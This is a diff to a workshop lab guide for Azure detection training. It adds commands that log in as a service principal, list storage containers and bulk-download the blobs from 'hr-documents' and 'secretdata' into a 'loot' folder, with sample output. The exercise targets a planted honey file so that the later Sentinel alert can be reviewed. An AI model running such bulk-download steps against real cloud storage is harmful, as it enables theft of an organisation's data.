@@ -3,7 +3,7 @@
 ### ToDo
 - [X] Write Objective text
 - [X] Write Exercise text
-- [ ] Provide Commands / Scripts
+- [X] Provide Commands / Scripts
 - [ ] Provide Screenshots
 
 -----
@@ -38,49 +38,77 @@ Perform the same attack as before from the Azure Cloud Shell, but use a service 
     2. First we need to change the principal az is using to access the storage. In your Azure Cloud Shell run the `az login` command with the credentials of the service principal. 
 
         ```powershell
-        <!---ALEX:commands---> 
+        az login --service-principal -u '<>' -p '<>' --tenant '<>' | jq .[].user 
         ```
 
         !!! summary "Sample results"
 
-            ```powershell
-             <!---ALEX:sampleoutput---> 
+            ```sql
+            {
+              "name": "dj49flw9-d834-mfde-ldo1-39fh3091dk3s",
+              "type": "servicePrincipal"
+            }
             ```
 
     3. As we already did this attack before, lets optimize our commands a bit to make this easier. First, we will again list our storage accounts and the container content.   
 
         ```powershell
-        <!---ALEX:commands---> 
-        ```
-
-        !!! summary "Expected result"
-
-            ```powershell
-             <!---ALEX:sampleoutput---> 
-            ```
-
-    4. Now run the script to download all the blobs from the container in which our honey file resides.
-
-        ```powershell
-        <!---ALEX:commands---> 
-        ```
-
-        !!! summary "Expected result"
-
-            ```powershell
-             <!---ALEX:sampleoutput---> 
-            ```
-
-    5. And a final command to verify that we got the blob successfully by outputting its content.
-
-        ```powershell
-        <!---ALEX:commands---> 
+        Write-Output ($storageAccount = az storage account list --resource-group 'DetectionWorkshop' | jq -r '.[] | select(.name | startswith("prod")) | .name'); Write-Output ($containerNamesArray = az storage container list --account-name $storageAccount --auth-mode login | jq -r '.[].name')
         ```
 
         !!! summary "Sample result"
 
-            ```powershell
-             <!---ALEX:sampleoutput---> 
+            ```
+            proddatadj35l13m5693m5
+            hr-documents
+            secretdata
+            ```
+
+    4. Now run the following command which creates a folder in your homedirectory called `exercise5_loot` and downloads all the blobs from the `hr-document` and `secretdata`.
+
+        ```powershell
+        New-Item -Path '~/' -Name "exercise5_loot" -ItemType "directory"; $containerNamesArray | foreach-object {az storage blob download-batch --account-name $storageAccount --source $_ --destination ~/exercise5_loot/ --overwrite true --auth-mode login | jq .}
+        ```
+
+        !!! summary "Sample result"
+
+            ```
+                Directory: /home/alex
+
+            UnixMode   User             Group                 LastWriteTime           Size Name
+            --------   ----             -----                 -------------           ---- ----
+            drwxr-xr-x alex             alex                5/13/2023 20:28           4096 exercise5_loot
+            Finished[#############################################################]  100.0000%
+            [
+            "job-posting-personalassistent-draft.txt",
+            "job-posting-secops-azure-draft.txt"
+            ]
+            Finished[#############################################################]  100.0000%
+            [
+            "final-instructions.txt"
+            ]
+            ```
+
+    5. And a final command to verify that we got the blobs successfully by outputting their content.
+
+        ```powershell
+        Get-ChildItem -Path '~/exercise5_loot' | foreach-object {$_.Name + ":"; (Get-Content $_) + "`n"}
+        ```
+
+        !!! summary "Sample result"
+
+            ```
+            final-instructions.txt:
+            When all is done:
+            ---- SNIP ----
+
+            job-posting-personalassistent-draft.txt:
+            Are you looking for a challenging and rewarding career as a personal assistant? Do you have a keen eye for details, a sharp mind for solving problems, and a passion for adventure? If so, you might be the perfect candidate for working with the world's most famous detective, Sherlock Holmes!
+            ---- SNIP ----
+
+            job-posting-secops-azure-draft.txt:
+            Are you a passionate and experienced cyber security engineer who loves solving complex problems and protecting valuable data? Do you have a strong background in Azure cloud services and security best practices? Do you want to work with one of the most brilliant and famous detectives in the world?
+            ---- SNIP ---- 
             ```
 
 ### Challenge 2: Review the Sentinel Incident
